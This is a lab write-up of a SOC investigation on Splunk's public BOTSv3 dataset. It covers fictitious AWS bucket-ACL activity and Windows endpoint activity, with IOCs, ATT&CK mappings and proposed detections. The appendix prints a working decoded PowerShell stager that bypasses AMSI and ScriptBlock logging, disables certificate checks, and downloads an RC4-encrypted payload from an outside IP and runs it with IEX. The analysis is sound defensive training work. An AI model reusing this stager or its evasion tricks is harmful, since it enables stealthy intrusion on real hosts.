# BOTSv3 SOC Investigation

> Educational lab using Splunk's public BOTSv3 dataset. This is not a real
> incident; "Frothly" is the fictitious company built into the dataset.
> Investigation performed independently in a self-hosted Splunk Enterprise
> (Docker) instance. See **Limitations** for data-quality issues and scope.

## Executive Summary

This educational BOTSv3 review contains two investigation threads on the
fictitious Frothly environment: AWS CloudTrail activity and Windows
endpoint activity. The published telemetry confirms two PutBucketAcl
events by the logged AWS identity bstoll, encoded PowerShell execution
and local account/group changes on FYODOR-L, and network connections to
45.77.53.176 from FYODOR-L and ABUNGST-L.

The evidence does not establish that the bucket became public, that S3
objects were read or exfiltrated, that bstoll's credentials were stolen,
or that FYODOR-L caused a compromise on ABUNGST-L. The decoded script is
Empire-like; exact framework/version attribution is unverified. The
browser parent establishes the first observed endpoint execution, not a
user click or download.

The repo includes a calibrated evidence ledger at docs/evidence-ledger.md,
production-minded detection designs at docs/detection-engineering.md,
search hygiene at docs/search-hygiene.md, and a conditional response
playbook at docs/response-playbook.md. These searches and fixtures are
proposed artifacts; they have not been run against the BOTSv3 dataset or
a Splunk ES instance.

## Methodology

1. Stood up Splunk Enterprise in Docker, ingested the BOTSv3 dataset
   (1.94M events / 107 sourcetypes at baseline), installed the Windows,
   Sysmon, AWS, O365, Unix, Stream, and CIM add-ons.
2. Ran orientation queries (`queries/q00-orientation.spl`) to map log
   sources, time range, and hosts before hunting (Step 4 of the lab
   guide).
3. Investigated two directions in depth: **Direction A (Cloud/AWS)** and
   **Direction B (Windows Endpoint)** — see `queries/q-a1-a4-cloudtrail.spl`
   and `queries/q-b1-b4-endpoint.spl`.
4. Followed a pivot loop for each finding: ask a question → write a
   query → record the result and a screenshot → extract a new IOC
   (IP/user/host) → pivot on that value across every sourcetype → repeat.
5. Mapped observations and hypotheses to MITRE ATT&CK and documented
   candidate detections. The searches have not been replayed against the
   dataset as part of this refactor.

## Data Quality Note — Timezone and Index Contamination

The original investigation saw a four-hour difference between the
Splunk Web time display and the raw Sysmon XML TimeCreated SystemTime
attribute. A UI timestamp is a rendering of the stored Unix _time and
can be localized. That display difference alone does not prove that the
stored event epoch is wrong. The earlier report added four hours to
published timestamps, but did not package the epoch comparison needed to
reproduce that correction.

Run the raw SystemTime comparison in queries/search-hygiene.spl. Compare
_time with the epoch parsed from the Z-suffixed XML timestamp. If they
match, the four-hour shift is presentation-only and _time must not be
changed. If the numeric delta is consistently four hours, investigate
timestamp parsing before altering the event timeline. The timestamps
below are the times published in the original report; retain them as
reported pending this reproducible comparison.

The Unix add-on also collected live Splunk-host command output into the
botsv3 index and extended its apparent range. The exclusion macro in
default/macros.conf scopes the reported TA-Nix sourcetypes; validate the
sourcetype/host pairs and event counts before claiming the 1.94M-event
baseline or applying the exclusion to all hosts.

## Timeline (times as published; UTC epoch validation pending)

| Time | Host / actor | Observed event | Calibrated status |
|---|---|---|---|
| 09:16:12 | web_admin, 35.153.154.221 | CreateUser and CreateAccessKey returned AccessDenied | [BLOCKED] |
| 09:35:27 | bstoll, 157.97.121.132 | AWS ConsoleLogin logged for bstoll | [CONFIRMED] login event; account abuse unresolved |
| 09:46:22 | mkraeusen, 107.77.212.175 | Cisco ASA WebVPN session logged | [CONFIRMED] session event |
| 10:01:41 | FYODOR-L | browser_broker.exe parent observed for encoded PowerShell process | [CONFIRMED] execution; user interaction unproven |
| 10:07:06 | FYODOR-L | fodhelper.exe process observed | [CONFIRMED] process; UAC bypass suspected |
| 10:08:17 | FYODOR-L | net.exe command line created local account svcvnc | [CONFIRMED] account creation |
| 10:08:35 | FYODOR-L | svcvnc added to local Administrators | [CONFIRMED] group change |
| 10:11:00 | FYODOR-L | PowerShell IEX execution observed, parent svchost.exe | [CONFIRMED] execution |
| 10:15:27 | FYODOR-L | WmiPrvSE.exe parent observed for execution | [CONFIRMED] local telemetry; remote target not established |
| 11:32:12 | FYODOR-L | Encoded PowerShell and fodhelper.exe observed; decoded script has AMSI/logging tampering, RC4 and IEX behavior | [CONFIRMED] behavior; framework attribution unverified |
| 13:01:46 | bstoll, 107.77.212.175 | PutBucketAcl on frothlywebcode | [CONFIRMED] ACL API call; public exposure unresolved |
| 13:57:22 | bstoll, 107.77.212.175 | AWS ConsoleLogin logged for bstoll | [CONFIRMED] login event; account abuse unresolved |
| 13:57:54 | bstoll, 107.77.212.175 | Second PutBucketAcl on frothlywebcode | [CONFIRMED] ACL API call; public exposure unresolved |
| Not bounded in published timeline | FYODOR-L and ABUNGST-L | 3,849 and 1,070 network events to 45.77.53.176:443, respectively | [CONFIRMED] network telemetry; shared C2 does not prove host-to-host movement |

The displayed times above preserve the original report's labels. The
raw-to-epoch query is required before treating the UTC conversion as
independently reproduced.

## Findings

### F1 — AWS identity and bucket ACL activity

CloudTrail records bstoll logging in and making two PutBucketAcl calls
against frothlywebcode. The repo does not publish the exact
Grantee.URI or a policy principal from either event, so public exposure
is unresolved. No S3 object-level reads or exfiltration are shown.
CloudTrail confirms the logged identity and API activity; it does not
establish credential theft or malicious intent.

The same IP address, 107.77.212.175, appears in a Cisco ASA WebVPN
session for mkraeusen. This is a useful correlation pivot, but shared
office/VPN egress and identity/session reuse remain alternatives.

### F2 — Endpoint execution and account changes

On FYODOR-L, Sysmon process telemetry shows browser_broker.exe as the
parent of encoded PowerShell, two fodhelper.exe executions, and
PowerShell behaviors that include AMSI and ScriptBlock logging changes,
RC4 decryption, and IEX. The exact user interaction behind the browser
parent is unproven. The fodhelper process evidence makes UAC bypass
plausible, but the ms-settings registry hijack and elevated token
integrity are not published.

Windows telemetry records creation of local account svcvnc followed by
addition to the local Administrators group. The actor and affected
account are separate event fields and must be shown separately in any
correlation. Network events show both FYODOR-L and ABUNGST-L connecting
to 45.77.53.176:443. This establishes activity on two hosts, not a
movement path from one to the other. The published evidence contains no
Event ID 4624 Type 3, remote WMI target, SMB/RPC pipe, PsExec, or
host-to-host transfer mechanism linking the hosts.

Use the evidence ledger for the event-level claim, ATT&CK status, and
falsifier/next-pivot for every step.

## Indicators of Compromise (IOCs)

| IOC | Type | Context and confidence |
|---|---|---|
| 45.77.53.176:443 | IP/port | Network destination in PowerShell-related telemetry on two hosts; suspected C2, no independent infrastructure attribution |
| https://45.77.53.176:443/admin/get.php | URL | URL embedded in decoded launcher behavior |
| PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI= | HTTP cookie | Value in decoded script; do not treat as unique family attribution |
| 107.77.212.175 | IP | CloudTrail bstoll and Cisco ASA mkraeusen records; shared egress versus identity misuse unresolved |
| 35.153.154.221 | IP | Source of blocked CreateUser/CreateAccessKey attempt |
| svcvnc | Local account | Account created and added to Administrators on FYODOR-L |
| DismHost.exe in a Temp GUID path; iexplorer.exe in Temp/unziped/lsof-master | File/path | Masquerading indicators; no hashes are published |

The repository does not publish file hashes or independent VirusTotal or
abuse.ch enrichment. The password visible in the lab command line is
omitted from this indicator table.

## MITRE ATT&CK Mapping

| Behavior | ATT&CK | Calibrated status |
|---|---|---|
| First observed PowerShell execution with browser_broker.exe parent | T1204 User Execution | [SUSPECTED / HYPOTHESIS] user click/download is unproven |
| Encoded PowerShell and IEX | T1059.001 PowerShell; T1027 Obfuscated Files or Information | [CONFIRMED] process/decoded behavior |
| fodhelper.exe execution | T1548.002 Bypass User Account Control | [SUSPECTED / HYPOTHESIS] ms-settings key and elevated token integrity unverified |
| AMSI and ScriptBlock logging tampering | T1562.001 Impair Defenses | [CONFIRMED] decoded script behavior; resulting security-control state not separately verified |
| svcvnc account created | T1136.001 Create Account: Local Account | [CONFIRMED] account-creation telemetry |
| svcvnc added to local Administrators | T1098.007 Additional Local or Domain Groups | [CONFIRMED] only after confirming target SID/member and Administrators group |
| bstoll CloudTrail activity | T1078 Valid Accounts | [SUSPECTED / HYPOTHESIS] logged identity is confirmed; adversary credential theft versus legitimate activity unresolved |
| web_admin CreateUser/CreateAccessKey attempt | T1136.003 Create Account: Cloud Account | [BLOCKED] AccessDenied; no created account/key established |
| PowerShell callback to 45.77.53.176 | T1071.001 Web Protocols | [CONFIRMED] network/script behavior; external control attribution remains an assessment |
| WMI process parent on FYODOR-L | T1047 Windows Management Instrumentation | [CONFIRMED] WMI-related execution evidence; remote movement is not established |
| C2 traffic from both hosts | No lateral movement ID asserted | [SUSPECTED / HYPOTHESIS] no causal host-to-host mechanism published |

Do not map the shared C2 destination to T1021.002 SMB/Windows Admin Shares
without SMB/admin-share telemetry connecting source and target.

## Detection Recommendations

Three ES correlation-search designs with explicit schedules, late-data
handling, RBA entities, thresholds, tuning and synthetic fixtures are in
docs/detection-engineering.md:

1. Public S3 ACL or bucket policy change, using normalized public-grant
   fields and an approved-public-bucket baseline.
2. Local account creation followed by addition to Administrators,
   correlated on target SID and separated actor fields.
3. Suspicious PowerShell process creation followed by non-RFC1918
   egress from the same ProcessGuid within ten minutes.

The SPL uses schema prerequisites that must be validated against the
Splunk Add-ons and CIM mappings in the deployment. The JSON fixtures are
synthetic examples with expected outcomes; they have not been run in
Splunk. Existing DET-02, DET-03 and DET-05 remain lab hunt examples
until their schema, schedule, baseline and alert lifecycle are tested.

## Response Playbook

The tailored AWS and endpoint response sequence is in
docs/response-playbook.md. It aligns governance, response and recovery
with NIST SP 800-61 Rev. 3 and CSF 2.0. All actions are recommendations
for a live incident, not actions performed in this BOTSv3 lab. Steps
that disable bstoll or remediate the bucket are conditional on evidence
and incident commander approval because account compromise and public
exposure are unresolved.

## Limitations

- Timezone: the earlier report says it added four hours to displayed
  timestamps. The package now supplies a raw SystemTime versus _time
  epoch comparison; until that is run, the published UTC labels are not
  independently reproduced.
- Index contamination: local Unix add-on collection inflated the
  observed index from 1.94M to 2.84M events and extended its apparent
  date range. default/macros.conf excludes only documented TA-Nix
  sourcetypes; run the inventory query to confirm they are collector
  noise and not genuine BOTSv3 telemetry before relying on counts.
- Evidence scope: public ACL grantee/policy, S3 object data events,
  remote host-to-host movement, raw query exports, and file hashes are
  not published.
- Detection status: proposed correlation searches and fixtures are
  unexecuted. Field aliases, lookup contents, CIM mapping, scheduler
  behavior and false-positive rates require validation in a Splunk ES
  deployment.
- Scope: AWS and Windows received the deepest hunts; Office 365,
  Linux/osquery, DNS and HTTP/SMB Stream were opportunistic pivots.
- Provenance: this is a BOTSv3 lab project. The current commit history
  and public answer material do not prove the research process, but no
  evidence in this repo supports a plagiarism allegation.

## Repo Structure

The refactor adds:

~~~
docs/evidence-ledger.md
docs/detection-engineering.md
docs/search-hygiene.md
docs/response-playbook.md
default/macros.conf
queries/search-hygiene.spl
queries/det-06-encoded-powershell-external-egress.spl
tests/fixtures/det-01-{positive,negative}.json
tests/fixtures/det-04-{positive,negative}.json
tests/fixtures/det-06-{positive,negative}.json
~~~

The dataset archive remains uncommitted; see the Splunk BOTSv3 dataset
repository for reproduction.

## Appendix — Decoded Empire-like PowerShell launcher behavior

Extracted from a `fodhelper.exe`-spawning PowerShell process on
`FYODOR-L` (Sysmon EventCode 1, `CommandLine` containing `-enc`).
Decoded from base64 (UTF-16LE) and lightly reformatted for readability;
logic is unchanged from the raw decode.

```powershell
If ($PSVersionTable.PSVersion.Major -ge 3) {
    $GPF = [ref].Assembly.GetType('System.Management.Automation.Utils').
        "GetFie`ld"('cachedGroupPolicySettings','N'+'onPublic,Static')
    If ($GPF) {
        $GPC = $GPF.GetValue($Null)
        If ($GPC['ScriptB'+'lockLogging']) {
            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
            $GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
        }
        $Val = [Collections.Generic.Dictionary[String,System.Object]]::New()
        $Val.Add('EnableScriptB'+'lockLogging',0)
        $Val.Add('EnableScriptBlockInvocationLogging',0)
        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $Val
    } Else {
        [ScriptBlock]."GetFie`ld"('signatures','N'+'onPublic,Static').
            SetValue($Null, (New-Object Collections.Generic.HashSet[string]))
    }
    # AMSI bypass
    $REF = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $REF.GetField('amsiInitFailed','NonPublic,Static').SetValue($Null, $True)
}

[System.Net.ServicePointManager]::Expect100Continue = 0
$wc = New-Object System.Net.WebClient
$u  = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
$wc.Headers.Add('User-Agent', $u)
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$Script:Proxy = $wc.Proxy

# RC4 key and implementation present in the decoded script
$K = [System.Text.Encoding]::ASCII.GetBytes('1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP')
$R = {
    $D, $K = $ARGS
    $S = 0..255
    0..255 | % { $J = ($J + $S[$_] + $K[$_ % $K.Count]) % 256; $S[$_],$S[$J] = $S[$J],$S[$_] }
    $D | % { $I = ($I+1)%256; $H = ($H+$S[$I])%256; $S[$I],$S[$H]=$S[$H],$S[$I]; $_ -bxor $S[($S[$I]+$S[$H])%256] }
}

$ser = 'https://45.77.53.176:443'
$t   = '/admin/get.php'
$wc.Headers.Add('Cookie', 'PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI=')
$datA = $wc.DownloadData($ser + $t)
$iv   = $datA[0..3]
$datA = $datA[4..($datA.Length)]
-Join [Char[]](& $R $datA ($IV + $K)) | IEX
```

**What it does, in order:**
1. Attempts to modify PowerShell ScriptBlock logging settings and set
   `AmsiUtils.amsiInitFailed = $true`; resulting endpoint control state
   was not independently verified.
2. Configures a `WebClient` with a spoofed IE11 User-Agent and disables
   TLS certificate validation.
3. Requests `https://45.77.53.176:443/admin/get.php` with a fixed
   session cookie.
4. RC4-decrypts the response using a hardcoded key and a 4-byte IV taken
   from the start of the response, then pipes the decrypted stage-2
   payload directly into `IEX` for in-memory execution.

The decoded behavior is Empire-like. The exact framework and version are
unverified without a sample hash and an independent comparison to a
primary framework source. Similar launcher behavior is not unique
attribution.
